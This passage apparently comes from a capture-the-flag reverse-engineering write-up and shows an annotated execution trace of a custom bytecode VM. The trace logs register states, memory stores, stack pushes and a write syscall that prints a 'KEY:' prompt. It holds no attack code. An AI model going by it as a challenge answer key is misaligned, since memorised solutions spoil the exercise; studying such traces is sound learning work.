class="hljs-number">0</span>xa3 d:<span class="hljs-number">0</span>xbf s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x6a f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa3 d:<span class="hljs-number">0</span>xbf s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x6b f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>xee<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>xee<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa3 d:<span class="hljs-number">0</span>xee s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x6c f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa4<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa4<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa4 d:<span class="hljs-number">0</span>xee s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x6d f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa4 d:<span class="hljs-number">0</span>xee s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x6e f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>xd8<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>xd8<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa4 d:<span class="hljs-number">0</span>xd8 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x6f f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa5<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa5<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa5 d:<span class="hljs-number">0</span>xd8 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x70 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa5 d:<span class="hljs-number">0</span>xd8 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x71 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x65<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x65<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa5 d:<span class="hljs-number">0</span>x65 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x72 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa6<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa6<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa6 d:<span class="hljs-number">0</span>x65 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x73 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa6 d:<span class="hljs-number">0</span>x65 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x74 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>xe0<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>xe0<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa6 d:<span class="hljs-number">0</span>xe0 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x75 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa7<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa7<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa7 d:<span class="hljs-number">0</span>xe0 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x76 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa7 d:<span class="hljs-number">0</span>xe0 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x77 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x15<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x15<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa7 d:<span class="hljs-number">0</span>x15 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x78 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa8<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa8<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa8 d:<span class="hljs-number">0</span>x15 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x79 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa8 d:<span class="hljs-number">0</span>x15 s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x7a f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x6b<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x6b<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa8 d:<span class="hljs-number">0</span>x6b s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x7b f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>xa9<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>xa9<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x6b s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x7c f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x8 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STM *c = d											<span class="hljs-comment">// a1[0xa9] = 0x6b</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x6b s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x7d f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x20 arg2:<span class="hljs-number">0</span>x8a<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">i</span> = <span class="hljs-number">0</span>x8a<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x6b s:<span class="hljs-number">0</span> <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x8b f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x4<br><span class="hljs-selector-attr">[s]</span> STK NONE <span class="hljs-selector-tag">a</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">a</span>										<span class="hljs-comment">// [0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x6b s:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x8c f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[s]</span> STK NONE <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">b</span>										<span class="hljs-comment">// [0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x6b s:<span class="hljs-number">0</span>x2 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x8d f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x8<br><span class="hljs-selector-attr">[s]</span> STK NONE c<br><span class="hljs-selector-attr">[s]</span> ... pushing c										<span class="hljs-comment">// [0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span> c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x6b s:<span class="hljs-number">0</span>x3 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x8e f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">b</span> = <span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x1 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x6b s:<span class="hljs-number">0</span>x3 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x8f f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x10 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span>x40<br><span class="hljs-selector-attr">[s]</span> ADD <span class="hljs-selector-tag">b</span> s<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x6b s:<span class="hljs-number">0</span>x3 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x90 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x4b<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x4b<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x4b s:<span class="hljs-number">0</span>x3 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x91 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d										<span class="hljs-comment">// [0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x4b s:<span class="hljs-number">0</span>x4 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x92 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x45<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x45<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x45 s:<span class="hljs-number">0</span>x4 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x93 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d										<span class="hljs-comment">// [0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x45 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x94 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x59<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x59<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x59 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x95 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d										<span class="hljs-comment">// [0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x59 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x96 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x3a<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x3a<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x3a s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x97 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d										<span class="hljs-comment">// [0x3a,0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x3a s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x98 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x1 arg2:<span class="hljs-number">0</span>x20<br><span class="hljs-selector-attr">[s]</span> IMM d = <span class="hljs-number">0</span>x20<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x20 s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x99 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> STK NONE d<br><span class="hljs-selector-attr">[s]</span> ... pushing d										<span class="hljs-comment">// [0x20,0x3a,0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>xa9 d:<span class="hljs-number">0</span>x20 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x9a f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x5<br><span class="hljs-selector-attr">[s]</span> IMM c = <span class="hljs-number">0</span>x5<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span> <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span>x20 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x9b f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x20 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> IMM <span class="hljs-selector-tag">a</span> = <span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span>x20 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x9c f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x1 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span>x1<br><span class="hljs-selector-attr">[s]</span> SYS <span class="hljs-number">0</span>x8 d<br><span class="hljs-selector-attr">[s]</span> ... write<br>KEY: <span class="hljs-selector-attr">[s]</span> ... return value (<span class="hljs-keyword">in</span> register d): <span class="hljs-number">0</span>x5<br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>x5 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x8 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x9d f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x8 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK c NONE<br><span class="hljs-selector-attr">[s]</span> ... popping c										<span class="hljs-comment">// c = 0x20</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x4 c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x9e f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x2 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">b</span> NONE<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">b</span>										<span class="hljs-comment">// b = 0x3a</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x1 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>x9f f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span>x4 arg2:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[s]</span> STK <span class="hljs-selector-tag">a</span> NONE<br><span class="hljs-selector-attr">[s]</span> ... popping <span class="hljs-selector-tag">a</span>										<span class="hljs-comment">// a = 0x59</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x5 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa0 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x4<br><span class="hljs-selector-attr">[s]</span> STK NONE <span class="hljs-selector-tag">a</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">a</span>										<span class="hljs-comment">// [0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x6 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa1 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x2<br><span class="hljs-selector-attr">[s]</span> STK NONE <span class="hljs-selector-tag">b</span><br><span class="hljs-selector-attr">[s]</span> ... pushing <span class="hljs-selector-tag">b</span>										<span class="hljs-comment">// [0x3a,0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> <span class="hljs-selector-tag">a</span>:<span class="hljs-number">0</span>x59 <span class="hljs-selector-tag">b</span>:<span class="hljs-number">0</span>x3a c:<span class="hljs-number">0</span>x20 d:<span class="hljs-number">0</span>x5 s:<span class="hljs-number">0</span>x7 <span class="hljs-selector-tag">i</span>:<span class="hljs-number">0</span>xa2 f:<span class="hljs-number">0</span><br><span class="hljs-selector-attr">[I]</span> op:<span class="hljs-number">0</span>x4 arg1:<span class="hljs-number">0</span> arg2:<span class="hljs-number">0</span>x8<br><span class="hljs-selector-attr">[s]</span> STK NONE c<br><span class="hljs-selector-attr">[s]</span> ... pushing c										<span class="hljs-comment">// [0x20,0x3a,0x59,0x45,0x4b, 0xa9,0,0]</span><br><span class="hljs-selector-attr">[V]</span> 